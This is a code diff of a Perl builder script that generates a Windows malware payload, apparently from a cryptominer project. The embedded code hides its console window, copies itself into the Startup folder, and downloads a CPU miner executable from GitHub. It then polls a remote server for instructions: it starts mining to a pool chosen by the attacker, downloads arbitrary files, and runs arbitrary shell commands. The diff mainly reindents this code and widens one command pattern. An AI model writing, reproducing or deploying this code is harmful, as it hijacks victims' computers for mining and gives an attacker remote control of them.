@@ -88,47 +88,47 @@ sub generate{
 #perl2exe_include Config
 #perl2exe_include Cwd
 
+\$SIG{INT} = 'IGNORE';
 BEGIN {
   use Win32::HideConsole qw[hide_console];
-  \$SIG{INT} = 'IGNORE';
   hide_console;
 }
 
 use LWP::UserAgent qw[get agent decoded_content];
 use LWP::Simple qw[getstore];
 use Config;
-use Cwd;
+use Cwd;  
 my \$disk = getcwd;
 if(\$disk =~ m/(.+):\\/(.+)/){\$disk = \$1;}
-  my \$ua = LWP::UserAgent->new;
-  \$ua->agent(\"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\");
-  while(1){
-    if(`dir %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup` !~ m/\$0/g){
-      system(\"copy \$0 %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup\");
+my \$ua = LWP::UserAgent->new;
+\$ua->agent(\"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\");
+while(1){
+  if(`dir %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup` !~ m/\$0/g){
+    system(\"copy \$0 %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup\");
+  }
+  while(! -e \"\$disk:\\\\Users\\\\\$ENV{USERNAME}\\\\AppData\\\\Roaming\\\\NsCpuCNMiner.exe\"){
+    if(\$Config{archname} =~ m/x86_64/ || \$Config{archname} =~ m/x64/){
+      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");
+    }else{
+      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");
     }
-    while(! -e \"\$disk:\\\\Users\\\\\$ENV{USERNAME}\\\\AppData\\\\Roaming\\\\NsCpuCNMiner.exe\"){
-      if(\$Config{archname} =~ m/x86_64/ || \$Config{archname} =~ m/x64/){
-        getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");
-      }else{
-        getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");
-      }
-      if(-e \"NsCpuCNMiner.exe\"){
-        system(\"move NsCpuCNMiner.exe %AppData%\");
-      }else{
-        next;
-      }
-    }
-    my \$response = \$ua->get(\"$_[0]\");
-    if(\$response->decoded_content =~ m/miner->host:(.+);email:(.+);/){
-      system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
-    }
-    if(\$response->decoded_content =~ m/download:(.+),(.+);/){
-      getstore(\"\$1\", \"\$2\");
-    }
-    if(\$response->decoded_content =~ m/system:(.+);/){
-      system(\"\$1\");
+    if(-e \"NsCpuCNMiner.exe\"){
+      system(\"move NsCpuCNMiner.exe %AppData%\");
+    }else{
+      next;
     }
   }
+  my \$response = \$ua->get(\"$_[0]\");
+  if(\$response->decoded_content =~ m/miner->host:(.+);email:(.+);|miner->host:(.+),email:(.+);/){
+    system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
+  }
+  if(\$response->decoded_content =~ m/download:(.+),(.+);/){
+    getstore(\"\$1\", \"\$2\");
+  }
+  if(\$response->decoded_content =~ m/system:(.+);/){
+    system(\"\$1\");
+  }
+}
 EXE
   close(OUTPUT);
   if($^V =~ m/5.24.1/){
